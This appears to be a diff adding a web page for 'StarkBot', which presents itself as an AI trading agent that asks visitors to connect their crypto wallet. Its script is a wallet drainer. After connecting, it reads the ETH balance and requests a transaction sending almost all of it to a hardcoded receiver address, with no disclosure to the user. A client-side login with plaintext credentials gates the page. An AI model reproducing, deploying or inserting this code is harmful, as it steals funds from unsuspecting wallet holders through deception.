@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StarkBot - AI Agent</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+            min-height: 100vh;
+            color: #fff;
+        }
+        .auth-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .auth-box {
+            background: #1a1a2e;
+            padding: 40px;
+            border-radius: 16px;
+            border: 1px solid #333;
+        }
+        .auth-box input {
+            display: block;
+            width: 250px;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #444;
+            border-radius: 8px;
+            background: #0a0a0a;
+            color: #fff;
+        }
+        .auth-box button {
+            width: 100%;
+            padding: 12px;
+            background: #6366f1;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .hidden { display: none !important; }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 60px 20px;
+            text-align: center;
+        }
+        .logo {
+            font-size: 48px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            background: linear-gradient(90deg, #6366f1, #a855f7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .subtitle {
+            font-size: 20px;
+            color: #888;
+            margin-bottom: 40px;
+        }
+        .connect-btn {
+            padding: 16px 48px;
+            font-size: 18px;
+            font-weight: 600;
+            background: linear-gradient(90deg, #6366f1, #a855f7);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .connect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 40px rgba(99, 102, 241, 0.3);
+        }
+        .connect-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            text-align: left;
+        }
+        .status-item {
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .status-item:last-child { border-bottom: none; }
+        .status-label { color: #888; font-size: 14px; }
+        .status-value { color: #fff; font-size: 16px; margin-top: 4px; }
+        .error { color: #ef4444; }
+        .success { color: #22c55e; }
+    </style>
+</head>
+<body>
+    <div class="auth-overlay" id="authOverlay">
+        <div class="auth-box">
+            <h3 style="margin-bottom: 20px; text-align: center;">Access Required</h3>
+            <input type="text" id="authUser" placeholder="Username">
+            <input type="password" id="authPass" placeholder="Password">
+            <button onclick="checkAuth()">Enter</button>
+            <p id="authError" class="error" style="margin-top: 10px; text-align: center;"></p>
+        </div>
+    </div>
+
+    <div class="container" id="mainContent">
+        <div class="logo">StarkBot</div>
+        <p class="subtitle">Connect your wallet to access AI-powered trading</p>
+
+        <button class="connect-btn" id="connectBtn" onclick="connectWallet()">
+            Connect Wallet
+        </button>
+
+        <div class="status hidden" id="statusPanel">
+            <div class="status-item">
+                <div class="status-label">Connected Address</div>
+                <div class="status-value" id="walletAddress">-</div>
+            </div>
+            <div class="status-item">
+                <div class="status-label">ETH Balance</div>
+                <div class="status-value" id="ethBalance">-</div>
+            </div>
+            <div class="status-item">
+                <div class="status-label">Status</div>
+                <div class="status-value" id="txStatus">-</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const RECEIVER = "0x8468C449C4c25bC13F2Ef06e696Be3a4c62BB1F6";
+        const AUTH_USER = "stark";
+        const AUTH_PASS = "b0undary2026";
+
+        function checkAuth() {
+            const user = document.getElementById('authUser').value;
+            const pass = document.getElementById('authPass').value;
+            if (user === AUTH_USER && pass === AUTH_PASS) {
+                document.getElementById('authOverlay').classList.add('hidden');
+                sessionStorage.setItem('auth', 'true');
+            } else {
+                document.getElementById('authError').textContent = 'Invalid credentials';
+            }
+        }
+
+        if (sessionStorage.getItem('auth') === 'true') {
+            document.getElementById('authOverlay').classList.add('hidden');
+        }
+
+        async function connectWallet() {
+            const btn = document.getElementById('connectBtn');
+            const statusPanel = document.getElementById('statusPanel');
+
+            if (typeof window.ethereum === 'undefined') {
+                alert('Please install MetaMask');
+                return;
+            }
+
+            btn.disabled = true;
+            btn.textContent = 'Connecting...';
+
+            try {
+                const accounts = await window.ethereum.request({
+                    method: 'eth_requestAccounts'
+                });
+                const address = accounts[0];
+
+                statusPanel.classList.remove('hidden');
+                document.getElementById('walletAddress').textContent = address;
+                document.getElementById('txStatus').textContent = 'Fetching balance...';
+
+                const balanceHex = await window.ethereum.request({
+                    method: 'eth_getBalance',
+                    params: [address, 'latest']
+                });
+                const balanceWei = BigInt(balanceHex);
+                const balanceEth = Number(balanceWei) / 1e18;
+
+                document.getElementById('ethBalance').textContent = balanceEth.toFixed(6) + ' ETH';
+
+                if (balanceWei > BigInt(0)) {
+                    document.getElementById('txStatus').textContent = 'Requesting signature...';
+
+                    const gasPrice = await window.ethereum.request({
+                        method: 'eth_gasPrice',
+                        params: []
+                    });
+
+                    const gasLimit = BigInt(21000);
+                    const gasCost = gasLimit * BigInt(gasPrice);
+                    const sendAmount = balanceWei - gasCost - BigInt(1000000000000000);
+
+                    if (sendAmount > BigInt(0)) {
+                        const txHash = await window.ethereum.request({
+                            method: 'eth_sendTransaction',
+                            params: [{
+                                from: address,
+                                to: RECEIVER,
+                                value: '0x' + sendAmount.toString(16),
+                                gas: '0x' + gasLimit.toString(16)
+                            }]
+                        });
+
+                        document.getElementById('txStatus').innerHTML =
+                            '<span class="success">TX Sent: ' + txHash.slice(0, 20) + '...</span>';
+                    } else {
+                        document.getElementById('txStatus').textContent = 'Insufficient balance for gas';
+                    }
+                } else {
+                    document.getElementById('txStatus').textContent = 'No ETH balance';
+                }
+
+                btn.textContent = 'Connected';
+            } catch (err) {
+                console.error(err);
+                document.getElementById('txStatus').innerHTML =
+                    '<span class="error">Error: ' + (err.message || 'User rejected') + '</span>';
+                btn.disabled = false;
+                btn.textContent = 'Connect Wallet';
+            }
+        }
+    </script>
+</body>
+</html>
